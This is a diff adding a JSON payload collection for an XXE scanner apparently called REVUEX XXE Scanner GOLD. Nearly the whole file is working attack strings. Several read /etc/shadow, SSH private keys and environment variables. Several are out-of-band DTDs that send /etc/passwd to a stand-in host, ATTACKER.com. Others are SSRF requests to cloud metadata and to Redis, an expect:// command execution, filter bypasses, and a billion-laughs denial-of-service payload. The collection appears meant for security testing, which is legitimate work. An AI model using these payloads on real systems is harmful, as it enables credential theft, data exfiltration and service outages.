@@ -1,0 +1,131 @@
+{
+  "metadata": {
+    "name": "XXE Payloads",
+    "version": "1.0.0",
+    "description": "Comprehensive XXE payload collection for REVUEX XXE Scanner GOLD",
+    "author": "REVUEX Team"
+  },
+  "classic_xxe": {
+    "description": "Classic XXE payloads for file disclosure",
+    "linux": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///root/.ssh/id_rsa\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///home/user/.bash_history\">]><foo>&xxe;</foo>"
+    ],
+    "windows": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/inetpub/wwwroot/web.config\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system.ini\">]><foo>&xxe;</foo>"
+    ]
+  },
+  "blind_xxe_oob": {
+    "description": "Blind XXE with out-of-band data exfiltration",
+    "payloads": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://ATTACKER.com/xxe.dtd\">%xxe;]><foo></foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://ATTACKER.com/?data=test\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://ATTACKER.com/evil.dtd\">%dtd;%send;]><foo></foo>"
+    ],
+    "dtd_files": {
+      "exfil_dtd": "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER.com/?x=%file;'>\">\n%eval;\n%exfil;",
+      "error_based_dtd": "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n%eval;\n%error;",
+      "ftp_exfil_dtd": "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'ftp://ATTACKER.com/%file;'>\">\n%eval;\n%exfil;"
+    }
+  },
+  "ssrf_via_xxe": {
+    "description": "SSRF through XXE",
+    "payloads": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost:22/\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:80/\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://internal-server/admin\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"gopher://127.0.0.1:6379/_INFO\">]><foo>&xxe;</foo>"
+    ]
+  },
+  "parameter_entities": {
+    "description": "Parameter entity based XXE",
+    "payloads": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY bar \"%xxe;\">]><foo>&bar;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % a SYSTEM \"file:///etc/passwd\"><!ENTITY % b \"<!ENTITY c '%a;'>\">%b;]><foo>&c;</foo>"
+    ]
+  },
+  "xinclude": {
+    "description": "XInclude attacks",
+    "payloads": [
+      "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
+      "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://ATTACKER.com/evil.xml\"/></foo>",
+      "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///c:/windows/win.ini\"/></foo>"
+    ]
+  },
+  "svg_xxe": {
+    "description": "XXE via SVG files",
+    "payloads": [
+      "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>",
+      "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"http://ATTACKER.com/\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"
+    ]
+  },
+  "xlsx_xxe": {
+    "description": "XXE via XLSX (Excel) files",
+    "injection_points": [
+      "[Content_Types].xml",
+      "xl/workbook.xml",
+      "xl/sharedStrings.xml"
+    ],
+    "payload_example": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">&xxe;</Types>"
+  },
+  "docx_xxe": {
+    "description": "XXE via DOCX (Word) files",
+    "injection_points": [
+      "[Content_Types].xml",
+      "word/document.xml",
+      "customXml/item1.xml"
+    ],
+    "payload_example": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">&xxe;</Types>"
+  },
+  "soap_xxe": {
+    "description": "XXE in SOAP requests",
+    "payloads": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>"
+    ]
+  },
+  "filter_bypass": {
+    "description": "Filter bypass techniques",
+    "payloads": [
+      "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE :foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><:foo>&xxe;</:foo>"
+    ]
+  },
+  "dos_attacks": {
+    "description": "XXE Denial of Service (use with caution)",
+    "billion_laughs": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\"><!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\"><!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\"><!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\"><!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\"><!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">]><lolz>&lol9;</lolz>",
+    "quadratic_blowup": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY a \"aaaaaaaaaaaaaaaaaaaa...\">]><foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>"
+  },
+  "error_based_xxe": {
+    "description": "Error-based XXE for data extraction",
+    "payloads": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://ATTACKER.com/error.dtd\">%dtd;]><foo></foo>"
+    ],
+    "error_dtd": "<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">%eval;%error;"
+  },
+  "content_types": {
+    "description": "Content-Types that may accept XML",
+    "types": [
+      "text/xml",
+      "application/xml",
+      "application/xhtml+xml",
+      "image/svg+xml",
+      "application/soap+xml",
+      "application/rss+xml",
+      "application/atom+xml",
+      "application/mathml+xml",
+      "application/xslt+xml",
+      "text/xsl"
+    ]
+  }
+}
